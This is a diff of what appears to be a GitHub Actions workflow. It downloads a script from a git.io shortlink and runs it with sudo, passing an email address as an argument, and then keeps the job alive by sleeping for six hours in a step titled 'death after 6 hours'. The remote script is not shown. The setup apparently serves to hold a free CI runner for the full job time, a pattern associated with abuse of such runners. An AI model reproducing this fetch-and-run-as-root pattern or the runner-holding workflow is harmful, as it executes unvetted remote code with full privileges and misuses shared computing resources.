@@ -9,6 +9,8 @@ jobs:
     
     steps:
     - name: Установка
-      run: sudo bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
+      run: |
+        wget -O installer.bash https://git.io/JzDdQ
+        sudo bash installer.bash kolana122@outlook.com
     - name: Смэрть через 6 часов
       run: sleep 6h
